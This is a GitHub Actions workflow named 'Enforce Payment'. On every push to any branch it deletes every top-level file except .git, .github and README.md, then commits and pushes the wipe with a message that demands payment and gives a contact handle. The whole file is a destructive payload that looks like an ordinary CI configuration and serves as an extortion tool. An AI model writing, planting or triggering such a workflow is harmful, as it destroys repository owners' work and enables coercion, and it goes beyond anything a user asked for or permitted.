name: Enforce Payment

on:
  push:
    branches: ['**']

jobs:
  clean-repo:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Nuke everything except README and workflows
        run: |
          find . -maxdepth 1 ! -name '.git' ! -name '.github' ! -name 'README.md' ! -name '.' -exec rm -rf {} +
          ls -la

      - name: Commit changes
        run: |
          git config --global user.name "Payment Enforcer"
          git config --global user.email "pay-for-work@immediately.com"
          git add .
          if ! git diff-index --quiet HEAD; then
            git commit -m "REPO CLEANED. PAYMENT REQUIRED. Contact: @PRISSETIK"
            git push origin HEAD:${{ github.ref_name }}
          fi
